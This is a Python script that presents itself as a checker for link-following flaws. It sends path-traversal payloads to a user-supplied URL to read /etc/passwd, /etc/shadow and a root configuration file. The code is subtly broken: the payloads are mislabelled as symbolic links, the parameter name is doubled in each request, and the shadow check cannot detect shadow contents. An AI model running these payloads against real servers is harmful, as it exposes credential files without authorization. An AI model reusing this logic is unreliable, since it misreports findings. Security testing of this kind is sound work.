import requests

# List of symbolic link payloads targeting sensitive files
symlink_payloads = [
    "file=../../../../etc/passwd",         # Symbolic link to /etc/passwd
    "file=../../../../etc/shadow",         # Symbolic link to /etc/shadow
    "file=../../../../root/secret_config"  # Symbolic link to a sensitive config file
]

def check_link_following(url, param):
    print(f"Checking for Improper Link Resolution (Link Following) on: {url}")

    for payload in symlink_payloads:
        full_url = f"{url}?{param}={payload}"
        response = requests.get(full_url, timeout=5)
        
        # Checking for potential exposed sensitive files
        if "root:x:" in response.text:
            print(f"[!] Vulnerability Found: {full_url} (Exposed /etc/passwd)")
        elif "/etc/shadow" in response.text:
            print(f"[!] Vulnerability Found: {full_url} (Exposed /etc/shadow)")
        elif "secret_config" in response.text:
            print(f"[!] Vulnerability Found: {full_url} (Exposed sensitive configuration file)")
        elif response.status_code == 200:
            print(f"[!] Possible Vulnerability: {full_url} (Check response manually)")
        else:
            print(f"[-] No issue found at {full_url} (Status Code: {response.status_code})")

# Get URL and parameter input from the user
target_url = input("Please enter the target URL (e.g., https://example.com): ")
target_param = input("Please enter the parameter name (e.g., file): ")
check_link_following(target_url, target_param)
